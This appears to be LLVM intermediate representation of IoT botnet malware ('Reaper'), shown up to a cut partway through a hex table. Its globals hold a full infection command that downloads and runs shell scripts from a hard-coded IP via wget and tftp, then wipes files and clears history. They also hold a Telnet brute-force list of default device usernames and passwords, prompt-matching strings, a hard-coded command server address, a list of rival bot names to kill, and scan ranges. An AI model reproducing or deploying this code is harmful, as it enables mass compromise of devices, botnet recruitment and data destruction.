; ModuleID = 'host/ir_O3/Reaper.b.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.ifreq = type { %union.anon.5, %union.anon.6 }
%union.anon.5 = type { [16 x i8] }
%union.anon.6 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }

@knownBots = local_unnamed_addr global [86 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.82, i32 0, i32 0)], align 16
@.str = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.1 = private unnamed_addr constant [7 x i8] c"mipsel\00", align 1
@.str.2 = private unnamed_addr constant [4 x i8] c"sh4\00", align 1
@.str.3 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"i686\00", align 1
@.str.5 = private unnamed_addr constant [4 x i8] c"ppc\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"i586\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"jackmy*\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"hackmy*\00", align 1
@.str.9 = private unnamed_addr constant [5 x i8] c"arm*\00", align 1
@.str.10 = private unnamed_addr constant [3 x i8] c"b1\00", align 1
@.str.11 = private unnamed_addr constant [3 x i8] c"b2\00", align 1
@.str.12 = private unnamed_addr constant [3 x i8] c"b3\00", align 1
@.str.13 = private unnamed_addr constant [3 x i8] c"b4\00", align 1
@.str.14 = private unnamed_addr constant [3 x i8] c"b5\00", align 1
@.str.15 = private unnamed_addr constant [3 x i8] c"b6\00", align 1
@.str.16 = private unnamed_addr constant [3 x i8] c"b7\00", align 1
@.str.17 = private unnamed_addr constant [3 x i8] c"b8\00", align 1
@.str.18 = private unnamed_addr constant [3 x i8] c"b9\00", align 1
@.str.19 = private unnamed_addr constant [17 x i8] c"busyboxterrorist\00", align 1
@.str.20 = private unnamed_addr constant [9 x i8] c"DFhxdhdf\00", align 1
@.str.21 = private unnamed_addr constant [10 x i8] c"dvrHelper\00", align 1
@.str.22 = private unnamed_addr constant [8 x i8] c"FDFDHFC\00", align 1
@.str.23 = private unnamed_addr constant [5 x i8] c"FEUB\00", align 1
@.str.24 = private unnamed_addr constant [9 x i8] c"FTUdftui\00", align 1
@.str.25 = private unnamed_addr constant [9 x i8] c"GHfjfgvj\00", align 1
@.str.26 = private unnamed_addr constant [6 x i8] c"jhUOH\00", align 1
@.str.27 = private unnamed_addr constant [9 x i8] c"JIPJIPJj\00", align 1
@.str.28 = private unnamed_addr constant [10 x i8] c"JIPJuipjh\00", align 1
@.str.29 = private unnamed_addr constant [10 x i8] c"kmyx86_64\00", align 1
@.str.30 = private unnamed_addr constant [10 x i8] c"lolmipsel\00", align 1
@.str.31 = private unnamed_addr constant [8 x i8] c"RYrydry\00", align 1
@.str.32 = private unnamed_addr constant [5 x i8] c"tel*\00", align 1
@.str.33 = private unnamed_addr constant [9 x i8] c"TwoFace*\00", align 1
@.str.34 = private unnamed_addr constant [9 x i8] c"UYyuyioy\00", align 1
@.str.35 = private unnamed_addr constant [5 x i8] c"wget\00", align 1
@.str.36 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.37 = private unnamed_addr constant [9 x i8] c"XDzdfxzf\00", align 1
@.str.38 = private unnamed_addr constant [5 x i8] c"xxb*\00", align 1
@.str.39 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.40 = private unnamed_addr constant [2 x i8] c"1\00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c"2\00", align 1
@.str.42 = private unnamed_addr constant [2 x i8] c"3\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c"4\00", align 1
@.str.44 = private unnamed_addr constant [2 x i8] c"5\00", align 1
@.str.45 = private unnamed_addr constant [2 x i8] c"6\00", align 1
@.str.46 = private unnamed_addr constant [2 x i8] c"7\00", align 1
@.str.47 = private unnamed_addr constant [2 x i8] c"8\00", align 1
@.str.48 = private unnamed_addr constant [2 x i8] c"9\00", align 1
@.str.49 = private unnamed_addr constant [3 x i8] c"10\00", align 1
@.str.50 = private unnamed_addr constant [3 x i8] c"11\00", align 1
@.str.51 = private unnamed_addr constant [3 x i8] c"12\00", align 1
@.str.52 = private unnamed_addr constant [3 x i8] c"13\00", align 1
@.str.53 = private unnamed_addr constant [3 x i8] c"14\00", align 1
@.str.54 = private unnamed_addr constant [3 x i8] c"15\00", align 1
@.str.55 = private unnamed_addr constant [3 x i8] c"16\00", align 1
@.str.56 = private unnamed_addr constant [3 x i8] c"17\00", align 1
@.str.57 = private unnamed_addr constant [3 x i8] c"18\00", align 1
@.str.58 = private unnamed_addr constant [3 x i8] c"19\00", align 1
@.str.59 = private unnamed_addr constant [3 x i8] c"20\00", align 1
@.str.60 = private unnamed_addr constant [6 x i8] c"hackz\00", align 1
@.str.61 = private unnamed_addr constant [5 x i8] c"bin*\00", align 1
@.str.62 = private unnamed_addr constant [5 x i8] c"gtop\00", align 1
@.str.63 = private unnamed_addr constant [5 x i8] c"ftp*\00", align 1
@.str.64 = private unnamed_addr constant [6 x i8] c"tftp*\00", align 1
@.str.65 = private unnamed_addr constant [7 x i8] c"botnet\00", align 1
@.str.66 = private unnamed_addr constant [8 x i8] c"swatnet\00", align 1
@.str.67 = private unnamed_addr constant [8 x i8] c"ballpit\00", align 1
@.str.68 = private unnamed_addr constant [8 x i8] c"fucknet\00", align 1
@.str.69 = private unnamed_addr constant [9 x i8] c"cracknet\00", align 1
@.str.70 = private unnamed_addr constant [8 x i8] c"weednet\00", align 1
@.str.71 = private unnamed_addr constant [7 x i8] c"gaynet\00", align 1
@.str.72 = private unnamed_addr constant [9 x i8] c"queernet\00", align 1
@.str.73 = private unnamed_addr constant [8 x i8] c"ballnet\00", align 1
@.str.74 = private unnamed_addr constant [5 x i8] c"unet\00", align 1
@.str.75 = private unnamed_addr constant [7 x i8] c"yougay\00", align 1
@.str.76 = private unnamed_addr constant [7 x i8] c"sttftp\00", align 1
@.str.77 = private unnamed_addr constant [7 x i8] c"sstftp\00", align 1
@.str.78 = private unnamed_addr constant [7 x i8] c"sbtftp\00", align 1
@.str.79 = private unnamed_addr constant [6 x i8] c"btftp\00", align 1
@.str.80 = private unnamed_addr constant [9 x i8] c"y0u1sg3y\00", align 1
@.str.81 = private unnamed_addr constant [6 x i8] c"bruv*\00", align 1
@.str.82 = private unnamed_addr constant [5 x i8] c"IoT*\00", align 1
@PromServer = local_unnamed_addr global [1 x i8*] [i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.83, i32 0, i32 0)], align 8
@.str.83 = private unnamed_addr constant [16 x i8] c"46.101.35.30:23\00", align 1
@infect = local_unnamed_addr global i8* getelementptr inbounds ([341 x i8], [341 x i8]* @.str.84, i64 0, i64 0), align 8
@.str.84 = private unnamed_addr constant [341 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.101.35.30/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 46.101.35.30 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 46.101.35.30; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c\0D\0A\00", align 1
@mainCommSock = local_unnamed_addr global i32 0, align 4
@currentServer = local_unnamed_addr global i32 -1, align 4
@gotIP = local_unnamed_addr global i32 0, align 4
@numpids = local_unnamed_addr global i64 0, align 8
@macAddress = local_unnamed_addr global [6 x i8] zeroinitializer, align 1
@usernames = local_unnamed_addr global [20 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.96, i32 0, i32 0)], align 16
@.str.85 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.86 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.87 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.88 = private unnamed_addr constant [8 x i8] c"daemon\00\00", align 1
@.str.89 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.90 = private unnamed_addr constant [8 x i8] c"666666\00\00", align 1
@.str.91 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.92 = private unnamed_addr constant [12 x i8] c"supervisor\00\00", align 1
@.str.93 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.94 = private unnamed_addr constant [6 x i8] c"1111\00\00", align 1
@.str.95 = private unnamed_addr constant [9 x i8] c"service\00\00", align 1
@.str.96 = private unnamed_addr constant [6 x i8] c"test\00\00", align 1
@passwords = local_unnamed_addr global [20 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.96, i32 0, i32 0)], align 16
@.str.97 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.98 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.99 = private unnamed_addr constant [6 x i8] c"anko\00\00", align 1
@.str.100 = private unnamed_addr constant [6 x i8] c"tini\00\00", align 1
@.str.101 = private unnamed_addr constant [8 x i8] c"Zte521\00\00", align 1
@.str.102 = private unnamed_addr constant [7 x i8] c"vizxv\00\00", align 1
@.str.103 = private unnamed_addr constant [10 x i8] c"zyad1234\00\00", align 1
@.str.104 = private unnamed_addr constant [10 x i8] c"1234qwer\00\00", align 1
@.str.105 = private unnamed_addr constant [12 x i8] c"oelinux123\00\00", align 1
@tmpdirs = local_unnamed_addr global [11 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.115, i32 0, i32 0), i8* null], align 16
@.str.106 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.107 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.108 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.109 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.110 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.111 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.112 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.113 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.114 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.115 = private unnamed_addr constant [6 x i8] c"/opt/\00", align 1
@advances = global [5 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.119, i32 0, i32 0), i8* null], align 16
@.str.116 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.117 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.118 = private unnamed_addr constant [8 x i8] c"sername\00", align 1
@.str.119 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@fails = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.126, i32 0, i32 0), i8* null], align 16
@.str.120 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.121 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.122 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.123 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.124 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.125 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.126 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@successes = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.129, i32 0, i32 0), i8* null], align 16
@.str.127 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.128 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.129 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.129, i32 0, i32 0), i8* null], align 16
@Nranges = local_unnamed_addr global [16 x i32] [i32 110, i32 111, i32 112, i32 113, i32 114, i32 115, i32 116, i32 117, i32 118, i32 119, i32 223, i32 1, i32 103, i32 203, i32 202, i32 122], align 16
@pids = common local_unnamed_addr global i32* null, align 8
@ourIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@scanPid = common local_unnamed_addr global i32 0, align 4
@ourPublicIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@Q = internal unnamed_addr global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal unnamed_addr global i32 4095, align 4
@c = internal unnamed_addr global i32 362436, align 4
@.str.558 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@fdopen_pids = internal unnamed_addr global i32* null, align 8
@.str.130 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.131 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal unnamed_addr constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 